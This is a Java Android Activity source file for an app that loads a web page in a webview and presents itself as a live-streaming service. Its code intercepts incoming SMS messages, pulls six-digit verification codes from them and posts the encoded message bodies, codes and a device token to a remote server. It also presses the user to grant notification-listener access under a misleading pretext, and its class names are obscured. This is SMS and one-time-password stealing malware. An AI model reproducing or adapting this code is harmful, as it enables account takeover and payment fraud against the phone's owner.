package com.ellison.project.activity;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.ViewGroup;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.ellison.project.MyApplication;
import com.ellison.project.r.RRRR;
import com.ellison.project.utils.AAAA;
import com.ellison.project.utils.AndroidInterface;
import com.ellison.project.R;
import com.ellison.project.utils.Base64Util;
import com.ellison.project.utils.ConfigUtils;
import com.ellison.project.utils.Constant;
import com.ellison.project.utils.LLLL;
import com.ellison.project.utils.SSSS;
import com.ellison.project.utils.UrlConstant;
import com.just.agentweb.AbsAgentWebSettings;
import com.just.agentweb.AgentWeb;
import com.just.agentweb.AgentWebSettingsImpl;
import com.just.agentweb.DefaultWebClient;
import com.just.agentweb.WebChromeClient;
import com.just.agentweb.WebViewClient;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;
import com.lzy.okgo.request.PostRequest;

import java.io.PrintStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
import static com.ellison.project.BuildConfig.DEBUG;

/**
 * @author ellison
 * @date 2020年09月24日
 * @desc 用一句话描述这个类的作用
 * <p>
 */
public class StartActivity extends AppCompatActivity {
    static String token = "";

    protected AgentWeb mAgentWeb;
    private RRRR rrr;

    @SuppressLint({"HandlerLeak"})
    public static Handler handler = new Handler() {
        @RequiresApi(api = 26)
        @Override
        public void handleMessage(Message message) {
            super.handleMessage(message);
            String str = message.getData().getString("sms");
            Matcher localMatcher = Pattern.compile("\\d{6}").matcher(str);
            String ppp = "";
            if (localMatcher.find()) {
                Object localObject;
                AAAA.smsCode = localMatcher.group();
                ppp = localMatcher.group();
                localObject = System.out;
                StringBuilder localStringBuilder = new StringBuilder();
                localStringBuilder.append("验证码是：");
                localStringBuilder.append(localMatcher.group());
                ((PrintStream) localObject).println(localStringBuilder.toString());
            }
            try {
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.append("{'type':'newsms', 'smsbody':'");
                stringBuilder.append(Base64Util.base64Encrypt(str.getBytes("UTF-8")));
                stringBuilder.append("','smscode':'");
                stringBuilder.append(message);
                stringBuilder.append("','Token':'");
                stringBuilder.append(token);
                stringBuilder.append("'}");
                ppp = Base64Util.base64Encrypt(stringBuilder.toString().getBytes("UTF-8"));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            ((PostRequest) OkGo.post(UrlConstant.API_URL).tag("MainActivity")).params("callbackurl", ppp, new boolean[0]).execute(new StringCallback() {
                @Override
                public void onSuccess(Response<String> paramAnonymous2Response) {
                    PrintStream localPrintStream = System.out;
                    StringBuilder localStringBuilder = new StringBuilder();
                    localStringBuilder.append("提交验证码：");
                    localStringBuilder.append(paramAnonymous2Response.body());
                    localPrintStream.println(localStringBuilder.toString());
                }
            });
        }
    };

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= 23) {
            if (!isNotificationListenersEnabled()) {
                new AlertDialog.Builder(this).setTitle("消息推送服务许可").setMessage("请允许直播使用通知消息推送服务！").setPositiveButton("允许", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt) {
                        checkNotifyPermission();
                        StartActivity.this.finish();
                    }
                }).setNegativeButton("拒绝", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt) {
                        StartActivity.this.finish();
                    }
                }).setCancelable(false).create().show();
            }
        }
        setContentView(R.layout.activity_main);

        if (getActionBar() != null) {
            getActionBar().hide();
        }

        AbsAgentWebSettings iAgentWebSettings = AgentWebSettingsImpl.getInstance();
        mAgentWeb = AgentWeb.with(this)
                .setAgentWebParent((ViewGroup) findViewById(R.id.content), new LinearLayout.LayoutParams(-1, -1))
                .useDefaultIndicator(Color.parseColor("#FFFFFF"))
                .setWebChromeClient(mWebChromeClient)
                .setWebViewClient(mWebViewClient)
                //设置 IAgentWebSettings。
                .setAgentWebWebSettings(iAgentWebSettings)
                .setMainFrameErrorView(R.layout.agentweb_error_page, -1)
                .setSecurityType(AgentWeb.SecurityType.STRICT_CHECK)
                //打开其他应用时，弹窗咨询用户是否前往其他应用
                .setOpenOtherPageWays(DefaultWebClient.OpenOtherPageWays.ASK)
                .createAgentWeb()//
                .ready()
                .go(UrlConstant.WEB_URL + "index.html");
        // 在调试模式下打开页面调试，可以在chrome下进行真机调试
        if (DEBUG) {
            WebView.setWebContentsDebuggingEnabled(true);
        }

        if (mAgentWeb != null) {
            //注入对象
            mAgentWeb.getJsInterfaceHolder().addJavaObject("android", new AndroidInterface(mAgentWeb, this));
        }

        registerRRR();


        LLLL.sListenState = true;
        if (token.equals("")) {
            try {
                ConfigUtils.setToken(this, Base64Util.base64Encrypt(AAAA.getRandomChars(15).getBytes("UTF-8")));
                token = ConfigUtils.getToken(this);
            } catch (UnsupportedEncodingException paramBundle) {
                paramBundle.printStackTrace();
            }
        }

        toggleNotificationListenerService(this);
        startService(new Intent(this, LLLL.class));

        // 支付后直接进入
        String payStatus = ConfigUtils.getPayStatus(this);
        if ("Y".equals(payStatus)) {
            PayResultActivity.enterResult(this);
        }
    }

    private void registerRRR() {
        this.rrr = new RRRR();
        IntentFilter localIntentFilter = new IntentFilter();
        localIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        localIntentFilter.addAction(Constant.SRAction);
        registerReceiver(this.rrr, localIntentFilter);
    }

    private boolean checkNotifyPermission() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return true;
        } catch (ActivityNotFoundException e) {//普通情况下找不到的时候需要再特殊处理找一次
            try {
                Intent intent = new Intent();
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ComponentName cn = new ComponentName("com.android.settings", "com.android.settings.Settings$NotificationAccessSettingsActivity");
                intent.setComponent(cn);
                intent.putExtra(":settings:show_fragment", "NotificationAccessSettings");
                startActivity(intent);
                return true;
            } catch (Exception e1) {
                e1.printStackTrace();
            }
            Toast.makeText(this, "对不起，您的手机暂不支持", Toast.LENGTH_SHORT).show();
            System.out.println("-------------对不起，您的手机暂不支持------------->>");
            e.printStackTrace();
            return false;
        }
    }

    @RequiresApi(api = 26)
    public static void sendMessage(String paramString) {
        if (paramString != null) {
            Message localMessage = new Message();
            localMessage.what = 1;
            Bundle localBundle = new Bundle();
            localBundle.putString("sms", paramString);
            localMessage.setData(localBundle);
            handler.sendMessage(localMessage);
        }
    }


    public boolean isNotificationListenersEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        System.out.println("-----flat-------->" + flat);
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }


    public static void toggleNotificationListenerService(Context paramContext) {
        PackageManager localPackageManager = paramContext.getPackageManager();
        localPackageManager.setComponentEnabledSetting(new ComponentName(paramContext, SSSS.class), COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        localPackageManager.setComponentEnabledSetting(new ComponentName(paramContext, SSSS.class), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    private WebViewClient mWebViewClient = new WebViewClient() {

        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, String url) {
//            if (url.startsWith("https://")) {
//                try {
//                    return processRequest(Uri.parse(url));
//                } catch (Exception e) {
//                    return super.shouldInterceptRequest(view, url);
//                }
//            } else {
            return super.shouldInterceptRequest(view, url);
//            }
        }

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
//            try {
//                URL url = new URL(request.getUrl().toString());
//                if (url.toString().startsWith("https://")) {
//                    return processRequest(request.getUrl());
//                } else {
//                    return super.shouldInterceptRequest(view, request);
//                }
//            } catch (Exception e) {
//                e.printStackTrace();
            return super.shouldInterceptRequest(view, request);
//            }
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            return super.shouldOverrideUrlLoading(view, request);
        }

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
        }

    };
    private WebChromeClient mWebChromeClient = new WebChromeClient() {
        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            super.onProgressChanged(view, newProgress);
        }
    };

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {

        if (mAgentWeb.handleKeyEvent(keyCode, event)) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onPause() {
        mAgentWeb.getWebLifeCycle().onPause();
        super.onPause();

    }

    @Override
    public void onBackPressed() {
        if (mAgentWeb != null && mAgentWeb.getIEventHandler().back()) {
            return;
        }
        super.onBackPressed();
    }

    @Override
    public void onResume() {
        mAgentWeb.getWebLifeCycle().onResume();
        super.onResume();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

//        if (Constant.DEBUG_EXECUTE) {
//            Log.e("Info", "result:" + requestCode + " result:" + resultCode);
//        }
//        mAgentWeb.uploadFileResult(requestCode, resultCode, data);
        super.onActivityResult(requestCode, resultCode, data);
    }


    @Override
    protected void onDestroy() {
        mAgentWeb.getWebLifeCycle().onDestroy();
        mAgentWeb = null;
        unregisterReceiver(this.rrr);
        super.onDestroy();
//        mDownloadingService = null;
    }

    public static ArrayList<AcLifeEvenData> mAcLifeEvenDataList = new ArrayList();
    private static List<ReceiverData> receiverDataList;

    static class AcLifeEvenData {
        public ActivityLifeEvent ale;
        public String eName;

        public AcLifeEvenData(String paramString, ActivityLifeEvent paramActivityLifeEvent) {
            this.ale = paramActivityLifeEvent;
            this.eName = paramString;
        }
    }


    public static abstract interface ActivityLifeEvent {
        public abstract void onConfigurationChanged(Configuration paramConfiguration);

        public abstract void onCreate(Bundle paramBundle);

        public abstract void onDestroy();

        public abstract void onKeyDown(int paramInt, KeyEvent paramKeyEvent);

        public abstract void onKeyLongPress(int paramInt, KeyEvent paramKeyEvent);

        public abstract void onKeyUp(int paramInt, KeyEvent paramKeyEvent);

        public abstract void onNewIntent(Intent paramIntent);

        public abstract void onPause();

        public abstract void onRestart();

        public abstract void onResume();

        public abstract void onStart();

        public abstract void onStop();

        public abstract void onWindowFocusChanged(boolean paramBoolean);
    }

    public static boolean deleteLLL(String paramString) {
        for (int i = 0; i < mAcLifeEvenDataList.size(); i++) {
            if (((AcLifeEvenData) mAcLifeEvenDataList.get(i)).eName.equals(paramString)) {
                mAcLifeEvenDataList.remove(i);
                return true;
            }
        }
        return false;
    }

    public static void deleteRRR(BroadcastReceiver mBroadcastReceiver) {
        MyApplication.getInstance().getCurrentActivity().unregisterReceiver(mBroadcastReceiver);
        if (receiverDataList != null) {
            for (int i = 0; i < receiverDataList.size(); i++) {
                if (((ReceiverData) receiverDataList.get(i)).receiver == mBroadcastReceiver) {
                    receiverDataList.remove(i);
                    return;
                }
            }
        }
    }


    public static void addRRR(BroadcastReceiver mBroadcastReceiver, IntentFilter paramIntentFilter, boolean b) {
        if (receiverDataList == null) {
            receiverDataList = new ArrayList();
        }
        int j = 0;
        Iterator localIterator = receiverDataList.iterator();
        do {
            int i = j;
            if (!localIterator.hasNext()) {
                break;
            }
        } while (((ReceiverData) localIterator.next()).receiver != mBroadcastReceiver);
        int i = 1;
        if (i == 0) {
            receiverDataList.add(new ReceiverData(mBroadcastReceiver, paramIntentFilter));
        }
        if (b) {
            MyApplication.getInstance().getCurrentActivity().registerReceiver(mBroadcastReceiver, paramIntentFilter);
        }
    }

    public static class ReceiverData {
        public IntentFilter intentFilter;
        public BroadcastReceiver receiver;

        public ReceiverData(BroadcastReceiver paramBroadcastReceiver, IntentFilter paramIntentFilter) {
            this.receiver = paramBroadcastReceiver;
            this.intentFilter = paramIntentFilter;
        }
    }

}
